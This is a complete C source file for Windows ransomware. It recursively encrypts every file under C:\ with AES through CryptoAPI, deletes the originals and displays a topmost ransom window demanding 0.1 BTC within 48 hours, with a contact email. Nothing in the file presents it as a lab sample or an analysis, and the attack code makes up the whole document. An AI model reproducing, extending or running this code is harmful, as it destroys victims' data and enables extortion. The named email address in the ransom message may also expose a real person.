#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <shlwapi.h>

#define ENCRYPT_EXT ".enc"
#define AES_KEY_SIZE 32 // 256 bits
#define TARGET_DIR "C:\\" // Change as needed

BOOL MyEncryptFile(const char* inFile, const char* outFile, BYTE* key, DWORD keyLen) {
    BOOL result = FALSE;
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    BYTE buffer[4096];
    DWORD bytesRead, bytesWritten, bufLen;
    HANDLE hIn, hOut;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return FALSE;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) goto cleanup;
    if (!CryptHashData(hHash, key, keyLen, 0)) goto cleanup;
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) goto cleanup;

    hIn = CreateFileA(inFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hIn == INVALID_HANDLE_VALUE) goto cleanup;
    hOut = CreateFileA(outFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) { CloseHandle(hIn); goto cleanup; }

    while (ReadFile(hIn, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        bufLen = bytesRead;
        if (!CryptEncrypt(hKey, 0, bytesRead < sizeof(buffer), 0, buffer, &bufLen, sizeof(buffer))) break;
        WriteFile(hOut, buffer, bufLen, &bytesWritten, NULL);
    }
    result = TRUE;
    CloseHandle(hIn);
    CloseHandle(hOut);

cleanup:
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    // Only delete the original if encryption succeeded
    if (result) {
        DeleteFileA(inFile);
    }
    return result;
}

void EncryptAllFiles(const char* dir, BYTE* key, DWORD keyLen) {
    WIN32_FIND_DATAA findData;
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s*", dir);

    HANDLE hFind = FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Skip "." and ".."
            if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                char subDir[MAX_PATH];
                snprintf(subDir, MAX_PATH, "%s%s\\", dir, findData.cFileName);
                EncryptAllFiles(subDir, key, keyLen); // Recurse into subdirectory
            }
        } else {
            char inFile[MAX_PATH], outFile[MAX_PATH];
            snprintf(inFile, MAX_PATH, "%s%s", dir, findData.cFileName);
            if (StrStrIA(findData.cFileName, ENCRYPT_EXT)) continue;
            snprintf(outFile, MAX_PATH, "%s%s%s", dir, findData.cFileName, ENCRYPT_EXT);
            MyEncryptFile(inFile, outFile, key, keyLen);
        }
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);
}

// Simple ransomware-style GUI using MessageBox and a topmost window
void ShowRansomwareGUI() {
    HWND hwnd = CreateWindowExA(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        "STATIC",
        "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!",
        WS_VISIBLE | WS_POPUP | SS_CENTER,
        400, 200, 500, 300,
        NULL, NULL, NULL, NULL
    );
    if (hwnd) {
        SetWindowTextA(hwnd,
            "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\r\n\r\n"
            "All your important files have been encrypted.\r\n"
            "To recover your files, send 0.1 BTC to:\r\n"
            "099287527372731723727372372731\r\n\r\n"
            "Contact: dexteredwardgerald@aclcbutuan.com\r\n"
            "You have 48 hours before your files are lost forever."
        );
        SetWindowPos(hwnd, HWND_TOPMOST, 400, 200, 500, 300, SWP_SHOWWINDOW);
        MessageBoxA(hwnd,
            "YOUR FILES HAVE BEEN ENCRYPTED!\n\n"
            "To recover your files, you must pay...\n"
            "Contact: dexteredwardgerald@aclcbutuan.com\n"
            "You have 48 hours.",
            "!!! WARNING !!!",
            MB_OK | MB_ICONHAND | MB_SYSTEMMODAL
        );
        DestroyWindow(hwnd);
    } else {
        // Fallback if window creation fails
        MessageBoxA(
            NULL,
            "YOUR FILES HAVE BEEN ENCRYPTED!\n\n"
            "To recover your files, you must pay...\n"
            "Contact: dexteredwardgerald@aclcbutuan.com\n"
            "You have 48 hours.",
            "!!! WARNING !!!",
            MB_OK | MB_ICONHAND | MB_SYSTEMMODAL
        );
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    BYTE key[AES_KEY_SIZE];
    memset(key, 0x23, AES_KEY_SIZE);

    EncryptAllFiles(TARGET_DIR, key, AES_KEY_SIZE);

    ShowRansomwareGUI();

    return 0;
}